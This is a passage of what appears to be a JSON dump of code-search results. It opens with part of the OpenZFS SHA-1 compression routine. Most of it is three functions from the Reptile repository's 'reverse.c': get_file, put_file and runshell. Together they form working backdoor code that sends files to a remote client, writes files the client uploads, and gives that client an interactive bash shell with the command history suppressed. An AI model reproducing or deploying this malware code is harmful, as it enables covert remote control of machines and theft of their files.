30);\n\n\tW(4) = ROTATE_LEFT((W(1) ^ W(12) ^ W(6) ^ W(4)), 1);\t\t/* 52 */\n\tc = ROTATE_LEFT(d, 5) + H(e, a, b) + c + W(4) + SHA1_CONST(2);\n\te = ROTATE_LEFT(e, 30);\n\n\tW(5) = ROTATE_LEFT((W(2) ^ W(13) ^ W(7) ^ W(5)), 1);\t\t/* 53 */\n\tb = ROTATE_LEFT(c, 5) + H(d, e, a) + b + W(5) + SHA1_CONST(2);\n\td = ROTATE_LEFT(d, 30);\n\n\tW(6) = ROTATE_LEFT((W(3) ^ W(14) ^ W(8) ^ W(6)), 1);\t\t/* 54 */\n\ta = ROTATE_LEFT(b, 5) + H(c, d, e) + a + W(6) + SHA1_CONST(2);\n\tc = ROTATE_LEFT(c, 30);\n\n\tW(7) = ROTATE_LEFT((W(4) ^ W(15) ^ W(9) ^ W(7)), 1);\t\t/* 55 */\n\te = ROTATE_LEFT(a, 5) + H(b, c, d) + e + W(7) + SHA1_CONST(2);\n\tb = ROTATE_LEFT(b, 30);\n\n\tW(8) = ROTATE_LEFT((W(5) ^ W(0) ^ W(10) ^ W(8)), 1);\t\t/* 56 */\n\td = ROTATE_LEFT(e, 5) + H(a, b, c) + d + W(8) + SHA1_CONST(2);\n\ta = ROTATE_LEFT(a, 30);\n\n\tW(9) = ROTATE_LEFT((W(6) ^ W(1) ^ W(11) ^ W(9)), 1);\t\t/* 57 */\n\tc = ROTATE_LEFT(d, 5) + H(e, a, b) + c + W(9) + SHA1_CONST(2);\n\te = ROTATE_LEFT(e, 30);\n\n\tW(10) = ROTATE_LEFT((W(7) ^ W(2) ^ W(12) ^ W(10)), 1);\t/* 58 */\n\tb = ROTATE_LEFT(c, 5) + H(d, e, a) + b + W(10) + SHA1_CONST(2);\n\td = ROTATE_LEFT(d, 30);\n\n\tW(11) = ROTATE_LEFT((W(8) ^ W(3) ^ W(13) ^ W(11)), 1);\t/* 59 */\n\ta = ROTATE_LEFT(b, 5) + H(c, d, e) + a + W(11) + SHA1_CONST(2);\n\tc = ROTATE_LEFT(c, 30);\n\n\t/* round 4 */\n\tW(12) = ROTATE_LEFT((W(9) ^ W(4) ^ W(14) ^ W(12)), 1);\t/* 60 */\n\te = ROTATE_LEFT(a, 5) + G(b, c, d) + e + W(12) + SHA1_CONST(3);\n\tb = ROTATE_LEFT(b, 30);\n\n\tW(13) = ROTATE_LEFT((W(10) ^ W(5) ^ W(15) ^ W(13)), 1);\t/* 61 */\n\td = ROTATE_LEFT(e, 5) + G(a, b, c) + d + W(13) + SHA1_CONST(3);\n\ta = ROTATE_LEFT(a, 30);\n\n\tW(14) = ROTATE_LEFT((W(11) ^ W(6) ^ W(0) ^ W(14)), 1);\t/* 62 */\n\tc = ROTATE_LEFT(d, 5) + G(e, a, b) + c + W(14) + SHA1_CONST(3);\n\te = ROTATE_LEFT(e, 30);\n\n\tW(15) = ROTATE_LEFT((W(12) ^ W(7) ^ W(1) ^ W(15)), 1);\t/* 63 */\n\tb = ROTATE_LEFT(c, 5) + G(d, e, a) + b + W(15) + SHA1_CONST(3);\n\td = ROTATE_LEFT(d, 30);\n\n\tW(0) = ROTATE_LEFT((W(13) ^ W(8) ^ W(2) ^ W(0)), 1);\t\t/* 64 */\n\ta = ROTATE_LEFT(b, 5) + G(c, d, e) + a + W(0) + SHA1_CONST(3);\n\tc = ROTATE_LEFT(c, 30);\n\n\tW(1) = ROTATE_LEFT((W(14) ^ W(9) ^ W(3) ^ W(1)), 1);\t\t/* 65 */\n\te = ROTATE_LEFT(a, 5) + G(b, c, d) + e + W(1) + SHA1_CONST(3);\n\tb = ROTATE_LEFT(b, 30);\n\n\tW(2) = ROTATE_LEFT((W(15) ^ W(10) ^ W(4) ^ W(2)), 1);\t/* 66 */\n\td = ROTATE_LEFT(e, 5) + G(a, b, c) + d + W(2) + SHA1_CONST(3);\n\ta = ROTATE_LEFT(a, 30);\n\n\tW(3) = ROTATE_LEFT((W(0) ^ W(11) ^ W(5) ^ W(3)), 1);\t\t/* 67 */\n\tc = ROTATE_LEFT(d, 5) + G(e, a, b) + c + W(3) + SHA1_CONST(3);\n\te = ROTATE_LEFT(e, 30);\n\n\tW(4) = ROTATE_LEFT((W(1) ^ W(12) ^ W(6) ^ W(4)), 1);\t\t/* 68 */\n\tb = ROTATE_LEFT(c, 5) + G(d, e, a) + b + W(4) + SHA1_CONST(3);\n\td = ROTATE_LEFT(d, 30);\n\n\tW(5) = ROTATE_LEFT((W(2) ^ W(13) ^ W(7) ^ W(5)), 1);\t\t/* 69 */\n\ta = ROTATE_LEFT(b, 5) + G(c, d, e) + a + W(5) + SHA1_CONST(3);\n\tc = ROTATE_LEFT(c, 30);\n\n\tW(6) = ROTATE_LEFT((W(3) ^ W(14) ^ W(8) ^ W(6)), 1);\t\t/* 70 */\n\te = ROTATE_LEFT(a, 5) + G(b, c, d) + e + W(6) + SHA1_CONST(3);\n\tb = ROTATE_LEFT(b, 30);\n\n\tW(7) = ROTATE_LEFT((W(4) ^ W(15) ^ W(9) ^ W(7)), 1);\t\t/* 71 */\n\td = ROTATE_LEFT(e, 5) + G(a, b, c) + d + W(7) + SHA1_CONST(3);\n\ta = ROTATE_LEFT(a, 30);\n\n\tW(8) = ROTATE_LEFT((W(5) ^ W(0) ^ W(10) ^ W(8)), 1);\t\t/* 72 */\n\tc = ROTATE_LEFT(d, 5) + G(e, a, b) + c + W(8) + SHA1_CONST(3);\n\te = ROTATE_LEFT(e, 30);\n\n\tW(9) = ROTATE_LEFT((W(6) ^ W(1) ^ W(11) ^ W(9)), 1);\t\t/* 73 */\n\tb = ROTATE_LEFT(c, 5) + G(d, e, a) + b + W(9) + SHA1_CONST(3);\n\td = ROTATE_LEFT(d, 30);\n\n\tW(10) = ROTATE_LEFT((W(7) ^ W(2) ^ W(12) ^ W(10)), 1);\t/* 74 */\n\ta = ROTATE_LEFT(b, 5) + G(c, d, e) + a + W(10) + SHA1_CONST(3);\n\tc = ROTATE_LEFT(c, 30);\n\n\tW(11) = ROTATE_LEFT((W(8) ^ W(3) ^ W(13) ^ W(11)), 1);\t/* 75 */\n\te = ROTATE_LEFT(a, 5) + G(b, c, d) + e + W(11) + SHA1_CONST(3);\n\tb = ROTATE_LEFT(b, 30);\n\n\tW(12) = ROTATE_LEFT((W(9) ^ W(4) ^ W(14) ^ W(12)), 1);\t/* 76 */\n\td = ROTATE_LEFT(e, 5) + G(a, b, c) + d + W(12) + SHA1_CONST(3);\n\ta = ROTATE_LEFT(a, 30);\n\n\tW(13) = ROTATE_LEFT((W(10) ^ W(5) ^ W(15) ^ W(13)), 1);\t/* 77 */\n\tc = ROTATE_LEFT(d, 5) + G(e, a, b) + c + W(13) + SHA1_CONST(3);\n\te = ROTATE_LEFT(e, 30);\n\n\tW(14) = ROTATE_LEFT((W(11) ^ W(6) ^ W(0) ^ W(14)), 1);\t/* 78 */\n\tb = ROTATE_LEFT(c, 5) + G(d, e, a) + b + W(14) + SHA1_CONST(3);\n\td = ROTATE_LEFT(d, 30);\n\n\tW(15) = ROTATE_LEFT((W(12) ^ W(7) ^ W(1) ^ W(15)), 1);\t/* 79 */\n\n\tctx-\u003estate[0] += ROTATE_LEFT(b, 5) + G(c, d, e) + a + W(15) +\n\t    SHA1_CONST(3);\n\tctx-\u003estate[1] += b;\n\tctx-\u003estate[2] += ROTATE_LEFT(c, 30);\n\tctx-\u003estate[3] += d;\n\tctx-\u003estate[4] += e;\n\n\t/* zeroize sensitive information */\n\tW(0) = W(1) = W(2) = W(3) = W(4) = W(5) = W(6) = W(7) = W(8) = 0;\n\tW(9) = W(10) = W(11) = W(12) = W(13) = W(14) = W(15) = 0;\n}","filepath":"module/icp/algs/sha1/sha1.c","line_number":421,"entry_url":"https://github.com/openzfs/zfs.git","slot_name":"zfs-2.0.0-rc1"},"4294993636":{"score":0.70169365,"function_name":"get_file","code":"int get_file(int client)\n{\n\tint ret, len, fd;\n\n\tret = pel_recv_msg(client, message, \u0026len);\n\n\tif (ret != PEL_SUCCESS)\n\t\treturn (ERROR);\n\n\tif (message[0] == OUT)\n\t\treturn 1;\n\n\tmessage[len] = '\\0';\n\n\tfd = open((char *)message, O_RDONLY);\n\n\tif (fd \u003c 0)\n\t\treturn (ERROR);\n\n\twhile (1) {\n\t\tlen = read(fd, message, BUFSIZE);\n\n\t\tif (len == 0)\n\t\t\tbreak;\n\t\tif (len \u003c 0)\n\t\t\treturn (ERROR);\n\n\t\tret = pel_send_msg(client, message, len);\n\n\t\tif (ret != PEL_SUCCESS)\n\t\t\treturn (ERROR);\n\t}\n\treturn 0;\n}","filepath":"sbin/reverse.c","line_number":33,"entry_url":"https://github.com/f0rb1dd3n/Reptile.git","slot_name":"2.0"},"4294993832":{"score":0.6802439,"function_name":"put_file","code":"int put_file(int client)\n{\n\tint ret, len, fd;\n\n\tret = pel_recv_msg(client, message, \u0026len);\n\n\tif (ret != PEL_SUCCESS)\n\t\treturn (ERROR);\n\n\tif (message[0] == OUT)\n\t\treturn (ERROR);\n\n\tmessage[len] = '\\0';\n\tfd = creat((char *)message, 0644);\n\n\tif (fd \u003c 0)\n\t\treturn (ERROR);\n\n\twhile (1) {\n\t\tret = pel_recv_msg(client, message, \u0026len);\n\n\t\tif (ret != PEL_SUCCESS)\n\t\t\treturn (ERROR);\n\n\t\tif (strncmp((char *)message, EXIT, EXIT_LEN) == 0)\n\t\t\tbreak;\n\n\t\tif (write(fd, message, len) != len)\n\t\t\treturn (ERROR);\n\t}\n\treturn 0;\n}","filepath":"sbin/reverse.c","line_number":68,"entry_url":"https://github.com/f0rb1dd3n/Reptile.git","slot_name":"2.0"},"4294994044":{"score":0.6521801,"function_name":"runshell","code":"int runshell(int client)\n{\n\tfd_set rd;\n\tstruct winsize ws;\n\tchar *slave, *temp, *shell;\n\tint ret, len, pid, pty, tty, n;\n\tchar *rcfile = RCFILE;\n\n\tif (openpty(\u0026pty, \u0026tty, NULL, NULL, NULL) \u003c 0)\n\t\treturn (ERROR);\n\n\tslave = ttyname(tty);\n\n\tif (slave == NULL)\n\t\treturn (ERROR);\n\n\tchdir(HOMEDIR);\n\tputenv(\"HISTFILE=\");\n\n\tret = pel_recv_msg(client, message, \u0026len);\n\n\tif (ret != PEL_SUCCESS)\n\t\treturn (ERROR);\n\n\tmessage[len] = '\\0';\n\tsetenv(\"TERM\", (char *)message, 1);\n\n\tret = pel_recv_msg(client, message, \u0026len);\n\n\tif (ret != PEL_SUCCESS || len != 4)\n\t\treturn (ERROR);\n\n\tws.ws_row = ((int)message[0] \u003c\u003c 8) + (int)message[1];\n\tws.ws_col = ((int)message[2] \u003c\u003c 8) + (int)message[3];\n\tws.ws_xpixel = 0;\n\tws.ws_ypixel = 0;\n\n\tif (ioctl(pty, TIOCSWINSZ, \u0026ws) \u003c 0)\n\t\treturn (ERROR);\n\n\tret = pel_recv_msg(client, message, \u0026len);\n\n\tif (ret != PEL_SUCCESS)\n\t\treturn (ERROR);\n\n\tif (len == 1 \u0026\u0026 message[0] == RUNSHELL) {\n\t\ttemp = (char *)malloc(20 + strlen(rcfile));\n\n\t\tif (temp == NULL)\n\t\t\treturn (ERROR);\n\n\t\tstrcpy(temp, \"exec bash --rcfile \");\n\t\tstrcat(temp, rcfile);\n\t} else {\n\t\tmessage[len] = '\\0';\n\t\ttemp = (char *)malloc(len + 1);\n\n\t\tif (temp == NULL)\n\t\t\treturn (ERROR);\n\n\t\tstrncpy(temp, (char *)message, len + 1);\n\t}\n\n\tpid = fork();\n\n\tif (pid \u003c 0)\n\t\treturn (ERROR);\n\n\tif (pid == 0) {\n\t\tclose(client);\n\t\tclose(pty);\n\n\t\tif (setsid() \u003c 0) {\n\t\t\tfree(temp);\n\t\t\treturn (ERROR);\n\t\t}\n\n\t\tif (ioctl(tty, TIOCSCTTY, NULL) \u003c 0) {\n\t\t\tfree(temp);\n\t\t\treturn (ERROR);\n\t\t}\n\n\t\tdup2(tty, 0);\n\t\tdup2(tty, 1);\n\t\tdup2(tty, 2);\n\n\t\tif (tty \u003e 2)\n\t\t\tclose(tty);\n\n\t\tshell = (char *)malloc(10);\n\n\t\tif (shell == NULL) {\n\t\t\tfree(temp);\n\t\t\treturn (ERROR);\n\t\t}\n\n\t\tstrcpy(shell, \"/bin/bash\");\n\n\t\texecl(shell, shell + 5, \"-c\", temp, (char *)0);\n\t\tfree(temp);\n\t\tfree(shell);\n\n\t\treturn 0;\n\t} else {\n\t\tclose(tty);\n\n\t\twhile (1) {\n\t\t\tFD_ZERO(\u0026rd);\n\t\t\tFD_SET(client, \u0026rd);\n\t\t\tFD_SET(pty, \u0026rd);\n\n\t\t\tn = (pty \u003e client) ? pty : client;\n\n\t\t\tif (select(n + 1, \u0026rd, NULL, NULL, NULL) \u003c 0)\n\t\t\t\treturn (ERROR);\n\n\t\t\tif (FD_ISSET(client, \u0026rd)) {\n\t\t\t\tret = pel_recv_msg(client, message, \u0026len);\n\n\t\t\t\tif (ret != PEL_SUCCESS)\n\t\t\t\t\treturn (ERROR);\n\t\t\t\tif (write(pty, message, len) != len)\n\t\t\t\t\treturn (ERROR);\n\t\t\t}\n\n\t\t\tif (FD_ISSET(pty, \u0026rd)) {\n\t\t\t\tlen = read(pty, message, BUFSIZE);\n\n\t\t\t\tif (len == 0)\n\t\t\t\t\tbreak;\n\t\t\t\tif (len \u003c 0)\n\t\t\t\t\treturn (ERROR);\n\n\t\t\t\tret = pel_send_msg(client, message, len);\n\n\t\t\t\tif (ret != PEL_SUCCESS)\n\t\t\t\t\treturn (ERROR);\n\t\t\t}\n\t\t}\n\t\treturn 0;\n\t}\n}","filepath":"sbin/reverse.c","line_number":101,"entry_url":"https://github.com/f0rb1dd3n/Reptile.git","slot_name":"2.0"}}}